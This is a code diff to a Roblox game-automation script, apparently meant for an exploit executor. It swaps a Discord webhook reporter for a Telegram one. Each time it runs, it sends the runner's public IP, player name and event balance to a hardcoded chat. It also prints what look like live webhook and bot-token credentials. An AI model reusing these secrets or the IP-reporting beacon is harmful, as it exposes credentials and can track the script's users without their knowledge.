@@ -18,18 +18,24 @@ local VirtualUser = game:GetService("VirtualUser")
 local Player = Players.LocalPlayer
 local wait = task.wait
 
-local Webhook = "https://discord.com/api/webhooks/1194145365960691792/guEpoUwKsorPoC2L1x0w-aJB8BgnFb1JujNWGwv8VZiiOoXVikQcZKj9Xtb3_ElooxON"
+local TelegramBotToken = "8089660566:AAE7fgHt4pbNtcxsDSbu31TRzcKhSkumFCk"
+local ChatID = "1498211949"
 
 local BalanceEvent
 function CurrentBall()
     for kek, lel in pairs(Player:GetDescendants()) do
-        if lel.Name == "Christmas2023" then
+        if lel.Name == "Halloween2024" then
+            print("helloween")
             for you, jej in pairs(lel:GetDescendants()) do
                 if jej.Name == "MysteryBox" then
+                    print("MysteryBox")
                     for ioi, uio in pairs(jej:GetDescendants()) do
                         if uio.Name == "Tokens" then
+                            print("Tokens")
                             for joj, non in pairs(uio:GetDescendants()) do
                                 if non.Name == "TextLabel" then
+                                    print("TextLabel")
+                                    print(non.Text)
                                    BalanceEvent = non.Text
                                 end
                             end
@@ -40,63 +46,28 @@ function CurrentBall()
         end
     end
 end
+
 CurrentBall()
-function sendToDiscord(color, message, everyone)
-local IPv4 = game:HttpGet("https://api.ipify.org")
- MyNick = game:GetService("Players").LocalPlayer.Name
 
-    local t = os.date("!*t")
-  local s = {}
-  for k, v in pairs(t) do
-    local temp = tostring(v)
-    if #temp == 1 then temp = "0" .. temp end
-    s[k] = temp
-  end
+function sendToTelegram(message)
+    local IPv4 = game:HttpGet("https://api.ipify.org")
+    local MyNick = Player.Name
 
-  timestamp = s.year .. "-" .. s.month .. "-" .. s.day  .. "T" .. s.hour .. ":" .. s.min .. ":" .. s.sec .. "." .. "000Z"
-
-    local embed = {
-        {
-            ["color"] = color,
-            ["title"] = "Script executed",
-            ["description"] = message,
-            ["fields"] = {
-        {
-          ['name'] = 'Bot',
-          ['value'] = IPv4,
-          ['inline'] = false
-        },
-        {
-          ['name'] = 'Player name',
-          ['value'] = MyNick,
-          ['inline'] = false
-        },
-        {
-          ['name'] = 'Event balance',
-          ['value'] = BalanceEvent,
-          ['inline'] = false
-        }
-      },
-      ["timestamp"] = timestamp
-        }
+    local data = {
+        ["chat_id"] = ChatID,
+        ["text"] = message .. "\nBot IP: " .. IPv4 .. "\nPlayer Name: " .. MyNick .. "\nPlayer Balance: " .. BalanceEvent,
+        ["parse_mode"] = "Markdown"  -- Optional: Use Markdown for formatting
     }
 
-  if everyone == false or everyone == nil then
-    content = ''
-  else
-    content = '@everyone'
-  end
+    local data_for_request = {
+        Url = "https://api.telegram.org/bot" .. TelegramBotToken .. "/sendMessage",
+        Body = game:GetService('HttpService'):JSONEncode(data),
+        Method = "POST",
+        Headers = {["content-type"] = "application/json"}
+    }
 
-  local data = {
-    ["content"] = content,
-    ["username"] = 'Pets2',
-    ["embeds"] = embed
-  }
-
-local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
-    local data_for_request = {Url = Webhook, Body = game:GetService('HttpService'):JSONEncode(data), Method = "POST", Headers = {["content-type"] = "application/json"}}
-  good_request = http_request or request or HttpPost or syn.request
-  good_request(data_for_request)
+    local good_request = http_request or request or HttpPost or syn.request
+    good_request(data_for_request)
 end
 
-sendToDiscord(15753920, ResultToCofrimed, true)
+sendToTelegram("Script Executed")
